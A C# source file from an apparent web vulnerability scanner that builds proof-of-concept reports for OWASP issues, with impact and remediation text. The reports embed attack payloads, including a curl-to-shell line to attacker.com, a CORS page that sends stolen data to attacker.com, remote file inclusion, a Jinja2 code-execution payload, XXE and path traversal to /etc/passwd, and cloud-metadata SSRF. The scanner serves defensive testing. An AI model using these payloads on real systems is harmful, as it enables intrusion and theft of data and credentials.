using System;
using System.Text;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Enhanced Proof of Concept generators for OWASP vulnerabilities
    /// </summary>
    public partial class OWASPT10_2025_ScannerService
    {
        #region SQL Injection PoCs

        private string GenerateSQLInjectionPoC(string url, string payload, string method)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== SQL Injection Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Method: {method}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine();
            sb.AppendLine("Example Exploitation:");
            sb.AppendLine();

            if (method == "GET")
            {
                sb.AppendLine($"curl '{url}?id={Uri.EscapeDataString(payload)}'");
            }
            else
            {
                sb.AppendLine($"curl -X POST '{url}' \\");
                sb.AppendLine("  -H 'Content-Type: application/json' \\");
                sb.AppendLine($"  -d '{{\"id\":\"{payload}\"}}'");
            }

            sb.AppendLine();
            sb.AppendLine("Impact: Authentication bypass, data exfiltration, database manipulation");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Use parameterized queries/prepared statements");
            sb.AppendLine("- Input validation and sanitization");
            sb.AppendLine("- Principle of least privilege for database accounts");
            sb.AppendLine("- Use ORM frameworks with proper escaping");

            return sb.ToString();
        }

        #endregion

        #region NoSQL Injection PoCs

        private string GenerateNoSQLInjectionPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== NoSQL Injection Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine();
            sb.AppendLine("MongoDB Injection Examples:");
            sb.AppendLine();
            sb.AppendLine("Authentication bypass:");
            sb.AppendLine("POST /login HTTP/1.1");
            sb.AppendLine("Content-Type: application/json");
            sb.AppendLine();
            sb.AppendLine("{");
            sb.AppendLine("  \"username\": {\"$ne\": null},");
            sb.AppendLine("  \"password\": {\"$ne\": null}");
            sb.AppendLine("}");
            sb.AppendLine();
            sb.AppendLine("Impact: Authentication bypass, unauthorized access, data extraction");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Input validation and type checking");
            sb.AppendLine("- Use MongoDB query operators carefully");
            sb.AppendLine("- Implement proper authentication");
            sb.AppendLine("- Sanitize user input before query construction");

            return sb.ToString();
        }

        #endregion

        #region XSS PoCs

        private string GenerateXSSPoC(string url, string payload, string type)
        {
            var sb = new StringBuilder();
            sb.AppendLine($"=== {type.ToUpper()} XSS Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine($"Type: {type}");
            sb.AppendLine();

            if (type == "reflected")
            {
                sb.AppendLine("Exploitation URL:");
                sb.AppendLine($"{url}?search={Uri.EscapeDataString(payload)}");
                sb.AppendLine();
                sb.AppendLine("Example attack scenario:");
                sb.AppendLine("1. Attacker crafts malicious URL");
                sb.AppendLine("2. Victim clicks on the link");
                sb.AppendLine("3. Malicious script executes in victim's browser");
                sb.AppendLine("4. Attacker steals session cookies or credentials");
            }
            else
            {
                sb.AppendLine("Exploitation steps:");
                sb.AppendLine("1. Submit malicious payload to the application");
                sb.AppendLine("2. Payload is stored in database");
                sb.AppendLine("3. Every user viewing the page executes the malicious script");
                sb.AppendLine();
                sb.AppendLine("Example POST request:");
                sb.AppendLine($"curl -X POST '{url}' \\");
                sb.AppendLine("  -H 'Content-Type: application/json' \\");
                sb.AppendLine($"  -d '{{\"comment\":\"{payload}\"}}'");
            }

            sb.AppendLine();
            sb.AppendLine("Impact: Session hijacking, credential theft, defacement, malware distribution");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Output encoding/escaping for all user input");
            sb.AppendLine("- Content Security Policy (CSP) headers");
            sb.AppendLine("- HTTPOnly and Secure flags on cookies");
            sb.AppendLine("- Input validation");

            return sb.ToString();
        }

        #endregion

        #region Command Injection PoCs

        private string GenerateCommandInjectionPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Command Injection Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine();
            sb.AppendLine("Exploitation URL:");
            sb.AppendLine($"{url}?cmd={Uri.EscapeDataString(payload)}");
            sb.AppendLine();
            sb.AppendLine("Example malicious commands:");
            sb.AppendLine("- ; cat /etc/passwd");
            sb.AppendLine("- | whoami");
            sb.AppendLine("- && curl http://attacker.com/shell.sh | sh");
            sb.AppendLine();
            sb.AppendLine("Impact: Remote code execution, system compromise, data theft");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Avoid using system commands with user input");
            sb.AppendLine("- Use safe APIs instead of shell commands");
            sb.AppendLine("- Input validation with whitelist approach");
            sb.AppendLine("- Run application with minimal privileges");

            return sb.ToString();
        }

        #endregion

        #region LDAP Injection PoCs

        private string GenerateLDAPInjectionPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== LDAP Injection Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine();
            sb.AppendLine("LDAP Filter Injection:");
            sb.AppendLine();
            sb.AppendLine("Normal query:");
            sb.AppendLine("(&(uid=username)(password=userpass))");
            sb.AppendLine();
            sb.AppendLine("Injected query:");
            sb.AppendLine("(&(uid=admin*)(password=*))");
            sb.AppendLine();
            sb.AppendLine("Impact: Authentication bypass, information disclosure");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Use parameterized LDAP queries");
            sb.AppendLine("- Input validation and sanitization");
            sb.AppendLine("- Escape special LDAP characters");
            sb.AppendLine("- Implement proper access controls");

            return sb.ToString();
        }

        #endregion

        #region XXE PoCs

        private string GenerateXXEPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== XXE (XML External Entity) Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Malicious XML Payload:");
            sb.AppendLine();
            sb.AppendLine("<?xml version=\"1.0\"?>");
            sb.AppendLine("<!DOCTYPE foo [");
            sb.AppendLine("  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">");
            sb.AppendLine("]>");
            sb.AppendLine("<foo>&xxe;</foo>");
            sb.AppendLine();
            sb.AppendLine("Example with curl:");
            sb.AppendLine($"curl -X POST '{url}' \\");
            sb.AppendLine("  -H 'Content-Type: application/xml' \\");
            sb.AppendLine("  -d @malicious.xml");
            sb.AppendLine();
            sb.AppendLine("Impact: File disclosure, SSRF, denial of service");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Disable external entity processing in XML parser");
            sb.AppendLine("- Use less complex data formats like JSON");
            sb.AppendLine("- Update XML parser libraries");
            sb.AppendLine("- Input validation");

            return sb.ToString();
        }

        #endregion

        #region SSRF PoCs

        private string GenerateSSRFPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== SSRF (Server-Side Request Forgery) Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"SSRF Target: {payload}");
            sb.AppendLine();
            sb.AppendLine("Exploitation URL:");
            sb.AppendLine($"{url}?url={Uri.EscapeDataString(payload)}");
            sb.AppendLine();
            sb.AppendLine("Cloud Metadata Exploitation:");
            sb.AppendLine();
            sb.AppendLine("AWS:");
            sb.AppendLine($"{url}?url=http://169.254.169.254/latest/meta-data/");
            sb.AppendLine();
            sb.AppendLine("Google Cloud:");
            sb.AppendLine($"{url}?url=http://metadata.google.internal/computeMetadata/v1/");
            sb.AppendLine();
            sb.AppendLine("Impact: Access to internal systems, cloud credentials theft, port scanning");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Whitelist allowed URLs/domains");
            sb.AppendLine("- Disable unused URL schemas (file://, gopher://, etc.)");
            sb.AppendLine("- Network segmentation");
            sb.AppendLine("- Validate and sanitize user input");

            return sb.ToString();
        }

        #endregion

        #region SSTI PoCs

        private string GenerateSSTIPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== SSTI (Server-Side Template Injection) Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine();
            sb.AppendLine("Template Engine Detection:");
            sb.AppendLine();
            sb.AppendLine("Jinja2 (Python): {{7*7}} -> 49");
            sb.AppendLine("Freemarker (Java): ${7*7} -> 49");
            sb.AppendLine("ERB (Ruby): <%= 7*7 %> -> 49");
            sb.AppendLine();
            sb.AppendLine("Example RCE payload (Jinja2):");
            sb.AppendLine("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}");
            sb.AppendLine();
            sb.AppendLine("Impact: Remote code execution, server compromise");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Use logic-less template engines");
            sb.AppendLine("- Sandbox template environment");
            sb.AppendLine("- Never pass user input directly to templates");
            sb.AppendLine("- Input validation and sanitization");

            return sb.ToString();
        }

        #endregion

        #region Path Traversal PoCs

        private string GeneratePathTraversalPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Path Traversal Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine();
            sb.AppendLine("Exploitation URL:");
            sb.AppendLine($"{url}?file={Uri.EscapeDataString(payload)}");
            sb.AppendLine();
            sb.AppendLine("Common targets:");
            sb.AppendLine("Linux: ../../../../etc/passwd");
            sb.AppendLine("Windows: ..\\..\\..\\..\\windows\\system32\\config\\sam");
            sb.AppendLine();
            sb.AppendLine("URL encoded payloads:");
            sb.AppendLine("%2e%2e%2f (../)");
            sb.AppendLine("%2e%2e%5c (..\\)");
            sb.AppendLine();
            sb.AppendLine("Impact: Unauthorized file access, information disclosure");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Use whitelist of allowed files");
            sb.AppendLine("- Validate and sanitize file paths");
            sb.AppendLine("- Use secure file access APIs");
            sb.AppendLine("- Implement proper access controls");

            return sb.ToString();
        }

        #endregion

        #region File Inclusion PoCs

        private string GenerateFileInclusionPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== File Inclusion Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine();
            sb.AppendLine("Local File Inclusion (LFI):");
            sb.AppendLine($"{url}?page=../../../../etc/passwd");
            sb.AppendLine();
            sb.AppendLine("PHP Wrappers:");
            sb.AppendLine($"{url}?page=php://filter/convert.base64-encode/resource=config.php");
            sb.AppendLine($"{url}?page=php://input (with POST data)");
            sb.AppendLine();
            sb.AppendLine("Remote File Inclusion (RFI):");
            sb.AppendLine($"{url}?page=http://attacker.com/shell.txt");
            sb.AppendLine();
            sb.AppendLine("Impact: Remote code execution, information disclosure");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Disable allow_url_include in PHP");
            sb.AppendLine("- Use whitelist for file includes");
            sb.AppendLine("- Validate and sanitize file paths");
            sb.AppendLine("- Implement proper access controls");

            return sb.ToString();
        }

        #endregion

        #region CRLF Injection PoCs

        private string GenerateCRLFInjectionPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== CRLF Injection Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Payload: {payload}");
            sb.AppendLine();
            sb.AppendLine("HTTP Response Splitting:");
            sb.AppendLine();
            sb.AppendLine("Injected headers:");
            sb.AppendLine("%0d%0aSet-Cookie: admin=true");
            sb.AppendLine("%0d%0aLocation: http://attacker.com");
            sb.AppendLine();
            sb.AppendLine("Impact: Session fixation, XSS, cache poisoning");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Validate and sanitize header values");
            sb.AppendLine("- Remove CRLF characters from user input");
            sb.AppendLine("- Use secure header APIs");
            sb.AppendLine("- Implement proper input validation");

            return sb.ToString();
        }

        #endregion

        #region Open Redirect PoCs

        private string GenerateOpenRedirectPoC(string url, string payload)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Open Redirect Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Redirect Target: {payload}");
            sb.AppendLine();
            sb.AppendLine("Exploitation URL:");
            sb.AppendLine($"{url}?redirect={Uri.EscapeDataString(payload)}");
            sb.AppendLine();
            sb.AppendLine("Example malicious URLs:");
            sb.AppendLine($"{url}?next=http://evil.com");
            sb.AppendLine($"{url}?url=//evil.com");
            sb.AppendLine($"{url}?redirect=javascript:alert(1)");
            sb.AppendLine();
            sb.AppendLine("Impact: Phishing, credential theft, malware distribution");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Whitelist allowed redirect URLs");
            sb.AppendLine("- Validate redirect destinations");
            sb.AppendLine("- Use relative URLs for redirects");
            sb.AppendLine("- Warn users about external redirects");

            return sb.ToString();
        }

        #endregion

        #region IDOR PoCs

        private string GenerateIDORPoC(string url, string testValue, string originalId)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== IDOR (Insecure Direct Object Reference) Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Original ID: {originalId}");
            sb.AppendLine($"Test ID: {testValue}");
            sb.AppendLine();
            sb.AppendLine("Testing horizontal privilege escalation:");
            sb.AppendLine($"GET {url}/{testValue}");
            sb.AppendLine();
            sb.AppendLine("Testing vertical privilege escalation:");
            sb.AppendLine($"GET {url}/admin");
            sb.AppendLine($"GET {url}/1 (admin user)");
            sb.AppendLine();
            sb.AppendLine("Impact: Unauthorized access to other users' data");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Implement proper authorization checks");
            sb.AppendLine("- Use indirect references (UUIDs)");
            sb.AppendLine("- Verify user permissions on every request");
            sb.AppendLine("- Use session-based access controls");

            return sb.ToString();
        }

        #endregion

        #region CORS PoCs

        private string GenerateCORSPoC(string url, string testOrigin, string vulnerableOrigin)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== CORS Misconfiguration Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Vulnerable Origin: {vulnerableOrigin}");
            sb.AppendLine();
            sb.AppendLine("Malicious HTML page:");
            sb.AppendLine();
            sb.AppendLine("<!DOCTYPE html>");
            sb.AppendLine("<html>");
            sb.AppendLine("<body>");
            sb.AppendLine("<script>");
            sb.AppendLine($"  fetch('{url}', {{");
            sb.AppendLine("    credentials: 'include'");
            sb.AppendLine("  })");
            sb.AppendLine("  .then(r => r.text())");
            sb.AppendLine("  .then(data => {");
            sb.AppendLine("    // Send stolen data to attacker");
            sb.AppendLine("    fetch('http://attacker.com/log?data=' + encodeURIComponent(data));");
            sb.AppendLine("  });");
            sb.AppendLine("</script>");
            sb.AppendLine("</body>");
            sb.AppendLine("</html>");
            sb.AppendLine();
            sb.AppendLine("Impact: Data theft, session hijacking");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Whitelist specific trusted origins");
            sb.AppendLine("- Avoid using Access-Control-Allow-Origin: *");
            sb.AppendLine("- Never reflect arbitrary Origin headers");
            sb.AppendLine("- Implement proper authentication");

            return sb.ToString();
        }

        #endregion


        #region Additional PoC Methods

        private string GenerateAccessControlPoC(string url, string response)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Broken Access Control Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Exploitation:");
            sb.AppendLine($"GET {url}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Unauthorized access to restricted resources");
            sb.AppendLine("- Data exposure");
            sb.AppendLine("- Privilege escalation");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Implement proper authentication and authorization");
            sb.AppendLine("- Use role-based access control (RBAC)");
            sb.AppendLine("- Validate permissions on every request");

            return sb.ToString();
        }

        private string GenerateSecurityHeaderPoC(string header, string description)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Missing Security Header Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Missing Header: {header}");
            sb.AppendLine($"Description: {description}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Increased vulnerability to various attacks");
            sb.AppendLine("- No defense-in-depth protection");
            sb.AppendLine("- Browser security features disabled");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine($"- Add {header} header to responses");
            sb.AppendLine("- Implement comprehensive security headers");
            sb.AppendLine("- Use security middleware");

            return sb.ToString();
        }

        private string GenerateVerboseErrorPoC(string url)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Verbose Error Messages Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Exploitation:");
            sb.AppendLine($"GET {url}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Information disclosure");
            sb.AppendLine("- Technology fingerprinting");
            sb.AppendLine("- Attack vector identification");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Use generic error messages");
            sb.AppendLine("- Log detailed errors server-side only");
            sb.AppendLine("- Disable debug mode in production");

            return sb.ToString();
        }

        private string GenerateDirectoryListingPoC(string url)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Directory Listing Enabled Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Exploitation:");
            sb.AppendLine($"GET {url}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Information disclosure");
            sb.AppendLine("- File enumeration");
            sb.AppendLine("- Source code exposure");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Disable directory listing");
            sb.AppendLine("- Use proper web server configuration");
            sb.AppendLine("- Implement access controls");

            return sb.ToString();
        }

        private string GenerateVulnerableComponentPoC(string component, string description)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Vulnerable Component Detected Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Component: {component}");
            sb.AppendLine($"Description: {description}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Known vulnerabilities exploitation");
            sb.AppendLine("- Security bypass");
            sb.AppendLine("- Remote code execution");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Update to latest secure versions");
            sb.AppendLine("- Use dependency scanning tools");
            sb.AppendLine("- Implement software composition analysis");

            return sb.ToString();
        }

        private string GenerateCDNInsecurePoC()
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Insecure CDN Resource Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine("Issue: Resources loaded over insecure HTTP from CDN");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Man-in-the-middle attacks");
            sb.AppendLine("- Content injection");
            sb.AppendLine("- Data tampering");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Use HTTPS for all CDN resources");
            sb.AppendLine("- Implement Subresource Integrity (SRI)");
            sb.AppendLine("- Use trusted CDNs only");

            return sb.ToString();
        }

        private string GenerateHTTPPoC(string url)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== HTTP Security Issues Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Data interception");
            sb.AppendLine("- Session hijacking");
            sb.AppendLine("- Credential theft");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Enforce HTTPS");
            sb.AppendLine("- Implement HSTS");
            sb.AppendLine("- Use secure cookies");

            return sb.ToString();
        }

        private string GenerateSensitiveDataPoC(string url, string pattern)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Sensitive Data Exposure Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Pattern: {pattern}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Data breach");
            sb.AppendLine("- Privacy violation");
            sb.AppendLine("- Compliance violation");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Encrypt sensitive data");
            sb.AppendLine("- Implement proper data handling");
            sb.AppendLine("- Use secure transmission protocols");

            return sb.ToString();
        }

        private string GenerateWeakCryptoPoC(string algorithm)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Weak Cryptographic Algorithm Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Algorithm: {algorithm}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Data compromise");
            sb.AppendLine("- Cryptographic attacks");
            sb.AppendLine("- Security bypass");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Use strong cryptographic algorithms");
            sb.AppendLine("- Implement proper key management");
            sb.AppendLine("- Follow cryptographic best practices");

            return sb.ToString();
        }

        private string GenerateRateLimitPoC(string url)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Missing Rate Limiting Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Exploitation:");
            sb.AppendLine("- Send unlimited requests");
            sb.AppendLine("- No throttling mechanism");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Denial of Service (DoS)");
            sb.AppendLine("- Brute force attacks");
            sb.AppendLine("- Resource exhaustion");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Implement rate limiting");
            sb.AppendLine("- Use sliding window algorithm");
            sb.AppendLine("- Add CAPTCHA for sensitive operations");

            return sb.ToString();
        }

        private string GenerateBusinessLogicPoC(string url, string param)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Business Logic Flaw Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Parameter: {param}");
            sb.AppendLine();
            sb.AppendLine("Exploitation:");
            sb.AppendLine("- Manipulate business logic constraints");
            sb.AppendLine("- Exploit validation gaps");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Financial loss");
            sb.AppendLine("- Fraud");
            sb.AppendLine("- Data manipulation");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Implement comprehensive validation");
            sb.AppendLine("- Use server-side checks");
            sb.AppendLine("- Apply business rule constraints");

            return sb.ToString();
        }

        private string GenerateWeakCredentialsPoC(string url, string username, string password)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Weak Default Credentials Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Credentials: {username}/{password}");
            sb.AppendLine();
            sb.AppendLine("Exploitation:");
            sb.AppendLine("- Use common default credentials");
            sb.AppendLine("- Automated credential testing");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Unauthorized access");
            sb.AppendLine("- Account takeover");
            sb.AppendLine("- System compromise");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Change default credentials");
            sb.AppendLine("- Implement strong password policy");
            sb.AppendLine("- Use multi-factor authentication");

            return sb.ToString();
        }

        private string GenerateSessionFixationPoC(string url, string sessionId)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Session Fixation Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine($"Session ID: {sessionId}");
            sb.AppendLine();
            sb.AppendLine("Exploitation:");
            sb.AppendLine("- Set known session ID");
            sb.AppendLine("- Victim logs in with same session");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Account hijacking");
            sb.AppendLine("- Session stealing");
            sb.AppendLine("- Unauthorized access");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Regenerate session ID after login");
            sb.AppendLine("- Use secure session management");
            sb.AppendLine("- Implement session timeout");

            return sb.ToString();
        }

        private string GenerateSRIPoC()
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Missing Subresource Integrity Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine("Issue: External resources loaded without integrity checks");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Supply chain attacks");
            sb.AppendLine("- Content injection");
            sb.AppendLine("- Malware distribution");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Implement Subresource Integrity (SRI)");
            sb.AppendLine("- Use trusted CDNs");
            sb.AppendLine("- Validate resource integrity");

            return sb.ToString();
        }

        private string GenerateDeserializationPoC(string url)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Insecure Deserialization Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Exploitation:");
            sb.AppendLine("- Send serialized malicious objects");
            sb.AppendLine("- Trigger deserialization vulnerabilities");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Remote code execution");
            sb.AppendLine("- Data tampering");
            sb.AppendLine("- System compromise");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Avoid deserializing untrusted data");
            sb.AppendLine("- Implement proper validation");
            sb.AppendLine("- Use safe serialization formats");

            return sb.ToString();
        }

        private string GenerateLoggingPoC()
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Insufficient Security Event Logging Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine("Issue: Security events not properly logged");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Lack of audit trail");
            sb.AppendLine("- Difficulty in incident response");
            sb.AppendLine("- Compliance violations");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Implement comprehensive logging");
            sb.AppendLine("- Log security-relevant events");
            sb.AppendLine("- Monitor and analyze logs");

            return sb.ToString();
        }

        private string GenerateExceptionHandlingPoC(string url)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Unhandled Exception Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Information disclosure");
            sb.AppendLine("- System instability");
            sb.AppendLine("- Attack vector exposure");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Implement proper error handling");
            sb.AppendLine("- Use generic error messages");
            sb.AppendLine("- Log exceptions securely");

            return sb.ToString();
        }

        private string GenerateNullExceptionPoC(string url)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== Null Reference Exception Proof of Concept ===");
            sb.AppendLine();
            sb.AppendLine($"Target URL: {url}");
            sb.AppendLine();
            sb.AppendLine("Impact:");
            sb.AppendLine("- Application crashes");
            sb.AppendLine("- Denial of service");
            sb.AppendLine("- Unexpected behavior");
            sb.AppendLine();
            sb.AppendLine("Remediation:");
            sb.AppendLine("- Implement null checks");
            sb.AppendLine("- Use defensive programming");
            sb.AppendLine("- Handle edge cases properly");

            return sb.ToString();
        }

        #endregion
    }
}
